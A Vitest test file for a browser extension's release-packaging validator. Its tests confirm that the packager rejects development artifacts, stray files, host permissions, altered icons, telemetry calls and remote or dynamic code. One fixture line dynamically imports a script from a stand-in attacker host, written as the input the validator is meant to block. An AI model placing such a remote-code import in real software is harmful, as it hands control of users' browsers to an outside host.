import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it } from "vitest";
import { createReleaseArchive } from "../package-release.mjs";

const roots = [];
const storeRoot = dirname(fileURLToPath(import.meta.url));
const iconRoot = join(storeRoot, "..", "static", "icons");
const icons = {
  16: "icon-16.png",
  32: "icon-32.png",
  48: "icon-48.png",
  128: "icon-128.png",
};
const iconSha256 = Object.fromEntries(
  await Promise.all(
    Object.entries(icons).map(async ([size, fileName]) => [
      size,
      createHash("sha256")
        .update(await readFile(join(iconRoot, fileName)))
        .digest("hex"),
    ]),
  ),
);
const policy = {
  schemaVersion: 1,
  releaseChannel: "synthetic-default-dark",
  archivePrefix: "applydash-job-capture",
  allowedFiles: [
    "background.js",
    "icon-128.png",
    "icon-16.png",
    "icon-32.png",
    "icon-48.png",
    "manifest.json",
    "popup.css",
    "popup.html",
    "popup.js",
    "sidepanel.html",
  ],
  manifest: {
    name: "ApplyDash Job Capture (Default Dark)",
    icons,
    iconSha256,
    requiredPermissions: ["activeTab", "alarms", "identity", "scripting", "sidePanel", "storage"],
    forbiddenPermissions: ["cookies", "history", "webRequest"],
    contentSecurityPolicy: "script-src 'self'; object-src 'self'",
  },
};

async function fixture() {
  const root = await mkdtemp(join(tmpdir(), "extension-package-test-"));
  roots.push(root);
  const dist = join(root, "dist");
  const firstOutput = join(root, "first");
  const secondOutput = join(root, "second");
  await mkdir(dist);
  const manifest = {
    manifest_version: 3,
    name: policy.manifest.name,
    version: "0.2.0",
    description: "Synthetic-only current-tab job capture and explicit contribution preview.",
    permissions: policy.manifest.requiredPermissions,
    background: { service_worker: "background.js", type: "module" },
    action: { default_icon: icons, default_popup: "popup.html" },
    content_security_policy: { extension_pages: policy.manifest.contentSecurityPolicy },
    icons,
    side_panel: { default_path: "sidepanel.html" },
  };
  await Promise.all([
    writeFile(join(dist, "manifest.json"), `${JSON.stringify(manifest, null, 2)}\n`),
    writeFile(join(dist, "background.js"), "export const background = true;\n"),
    writeFile(join(dist, "popup.js"), "export const popup = true;\n"),
    writeFile(join(dist, "popup.css"), "body { color: #111; }\n"),
    writeFile(join(dist, "popup.html"), '<script type="module" src="popup.js"></script>\n'),
    writeFile(join(dist, "sidepanel.html"), '<script type="module" src="popup.js"></script>\n'),
    ...Object.values(icons).map(async (fileName) =>
      writeFile(join(dist, fileName), await readFile(join(iconRoot, fileName))),
    ),
  ]);
  return { dist, firstOutput, secondOutput, manifest };
}

afterEach(async () => {
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
});

describe("extension release packaging", () => {
  it.each(
    ["popup.html", "sidepanel.html"].flatMap((file) =>
      ["queue-panel", "contributions-panel", "appeal-dialog"].map((id) => ({ file, id })),
    ),
  )("rejects diagnostic $id in $file even when hidden", async ({ file, id }) => {
    const { dist, firstOutput } = await fixture();
    await writeFile(join(dist, file), `<section hidden id='${id}'></section>`);
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Development diagnostics HTML cannot be store-packaged");
  });

  it("rejects development JavaScript even if a default-dark manifest was copied over it", async () => {
    const { dist, firstOutput } = await fixture();
    await writeFile(
      join(dist, "background.js"),
      "// UNPACKED_DEVELOPMENT_CONTRIBUTIONS_ONLY\nexport const background = true;\n",
    );
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Development contribution JavaScript cannot be store-packaged");
  });
  it("rejects a development-marked artifact even without live host permissions", async () => {
    const { dist, firstOutput, manifest } = await fixture();
    await writeFile(
      join(dist, "manifest.json"),
      JSON.stringify({ ...manifest, version_name: "0.2.0-development-contributions" }),
    );
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Development contribution artifacts cannot be store-packaged");
  });
  it("creates byte-identical archives and sorted digest manifests", async () => {
    const { dist, firstOutput, secondOutput } = await fixture();
    const first = await createReleaseArchive({
      distDirectory: dist,
      outputDirectory: firstOutput,
      packageVersion: "0.2.0",
      policy,
    });
    const second = await createReleaseArchive({
      distDirectory: dist,
      outputDirectory: secondOutput,
      packageVersion: "0.2.0",
      policy,
    });
    expect(second).toEqual(first);
    expect(first.files.map((file) => file.name)).toEqual([...policy.allowedFiles].sort());
    expect(await readFile(join(firstOutput, first.archive.name))).toEqual(
      await readFile(join(secondOutput, second.archive.name)),
    );
  });

  it("rejects unexpected files and default-dark host permissions", async () => {
    const { dist, firstOutput, manifest } = await fixture();
    await writeFile(join(dist, "unexpected.txt"), "not reviewed\n");
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("file allowlist");
    await rm(join(dist, "unexpected.txt"));
    await writeFile(
      join(dist, "manifest.json"),
      `${JSON.stringify({ ...manifest, host_permissions: ["https://example.test/*"] })}\n`,
    );
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("cannot contain host permissions");
  });

  it("rejects mismatched manifest icons and malformed icon dimensions", async () => {
    const { dist, firstOutput, manifest } = await fixture();
    await writeFile(
      join(dist, "manifest.json"),
      `${JSON.stringify({ ...manifest, icons: { ...icons, 128: "icon-48.png" } })}\n`,
    );
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Manifest icons");

    await writeFile(join(dist, "manifest.json"), `${JSON.stringify(manifest)}\n`);
    await writeFile(join(dist, "icon-128.png"), await readFile(join(iconRoot, "icon-48.png")));
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("128x128 PNG");
  });

  it("rejects an unreviewed icon digest", async () => {
    const { dist, firstOutput } = await fixture();
    const icon = await readFile(join(dist, "icon-16.png"));
    icon[icon.length - 1] ^= 1;
    await writeFile(join(dist, "icon-16.png"), icon);
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("icon digest");
  });

  it("rejects remote executable JavaScript and dynamic code construction", async () => {
    const { dist, firstOutput } = await fixture();
    await writeFile(
      join(dist, "background.js"),
      'const module = import("https://attacker.example/remote.js");\n',
    );
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Remote executable JavaScript");

    await writeFile(join(dist, "background.js"), 'const execute = new Function("return 1");\n');
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Dynamic code construction");
  });

  it("rejects telemetry endpoints from the zero-telemetry release", async () => {
    const { dist, firstOutput } = await fixture();
    await writeFile(join(dist, "background.js"), 'fetch("https://sentry.io/api/report");\n');
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Telemetry endpoint");
  });
});
